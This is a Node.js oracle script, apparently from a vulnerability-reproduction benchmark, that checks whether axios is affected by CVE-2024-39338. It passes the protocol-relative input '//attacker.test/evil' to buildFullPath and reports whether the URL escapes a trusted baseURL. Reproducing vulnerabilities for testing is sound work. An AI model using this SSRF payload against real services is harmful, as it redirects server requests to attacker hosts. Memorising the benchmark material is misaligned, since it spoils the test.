'use strict';

function main() {
  let buildFullPath;

  try {
    let mod = require('axios/unsafe/core/buildFullPath.js');
    buildFullPath = (mod && mod.default) ? mod.default : mod;
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Failed to require buildFullPath module: ' + (e && e.message ? e.message : String(e))
    }));
    return;
  }

  if (typeof buildFullPath !== 'function') {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Required export is not a function; cannot exercise target API'
    }));
    return;
  }

  const baseURL = 'http://trusted-internal.example.com/api/';

  // --- Benign case ---
  // Confirm the normal, intended combination of baseURL with a
  // relative path works as documented: buildFullPath should combine
  // the relative path with the trusted baseURL, producing a URL
  // rooted at the trusted host. Also confirm that a normal absolute
  // URL (with an explicit scheme) is passed through verbatim, as
  // intended by design (callers who pass a full absolute URL expect
  // it to be used as-is).
  let benignRelativeFullPath;
  let benignAbsoluteFullPath;
  try {
    benignRelativeFullPath = buildFullPath(baseURL, '/users/list');
    benignAbsoluteFullPath = buildFullPath(baseURL, 'https://other-service.example.com/x');
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Benign calls threw: ' + (e && e.message ? e.message : String(e))
    }));
    return;
  }

  const benignOk = typeof benignRelativeFullPath === 'string' &&
    benignRelativeFullPath.indexOf('trusted-internal.example.com') !== -1 &&
    benignRelativeFullPath.indexOf('/users/list') !== -1 &&
    typeof benignAbsoluteFullPath === 'string' &&
    benignAbsoluteFullPath.indexOf('other-service.example.com') !== -1;

  if (!benignOk) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Benign result unexpected. relativeFullPath=' + String(benignRelativeFullPath) +
        ' absoluteFullPath=' + String(benignAbsoluteFullPath)
    }));
    return;
  }

  const operation_completed = true;

  // --- Malicious case ---
  // This reproduces CVE-2024-39338: axios SSRF due to isAbsoluteURL
  // (used internally by buildFullPath) failing to treat
  // protocol-relative URLs (e.g. "//attacker.test/evil") as absolute.
  // When a caller configures a trusted baseURL expecting all requests
  // to be confined to that host, and passes a user-controlled path
  // that happens to be a protocol-relative URL, the patched axios
  // combines it with baseURL (keeping requests confined to the
  // trusted host's authority, i.e. producing something rooted at
  // "trusted-internal.example.com"). The vulnerable axios instead
  // classifies it as absolute and returns the attacker-controlled
  // URL completely unchanged, which -- when later used by an HTTP
  // client -- resolves to "attacker.test" rather than the trusted
  // host. This is a confinement bypass / SSRF.
  const maliciousInput = '//attacker.test/evil';

  let maliciousFullPath;
  let threw = false;
  let errMsg = '';
  try {
    maliciousFullPath = buildFullPath(baseURL, maliciousInput);
  } catch (e) {
    threw = true;
    errMsg = e && e.message ? e.message : String(e);
  }

  let exploit_succeeded;
  let evidence;

  if (threw) {
    exploit_succeeded = false;
    evidence = 'buildFullPath threw while combining baseURL with protocol-relative attacker URL: ' + errMsg;
  } else {
    const escapedToAttacker = typeof maliciousFullPath === 'string' &&
      maliciousFullPath.indexOf('attacker.test') !== -1 &&
      maliciousFullPath.indexOf('trusted-internal.example.com') === -1;

    if (escapedToAttacker) {
      exploit_succeeded = true;
      evidence = 'buildFullPath returned attacker-controlled protocol-relative URL verbatim, escaping baseURL confinement (SSRF). Result: ' + String(maliciousFullPath);
    } else {
      exploit_succeeded = false;
      evidence = 'Attacker-controlled protocol-relative URL was confined under trusted baseURL as expected. fullPath=' + String(maliciousFullPath);
    }
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed,
    exploit_succeeded,
    evidence
  }));
}

try {
  main();
} catch (e) {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: false,
    exploit_succeeded: false,
    evidence: 'Unhandled exception in oracle script: ' + (e && e.message ? e.message : String(e))
  }));
}
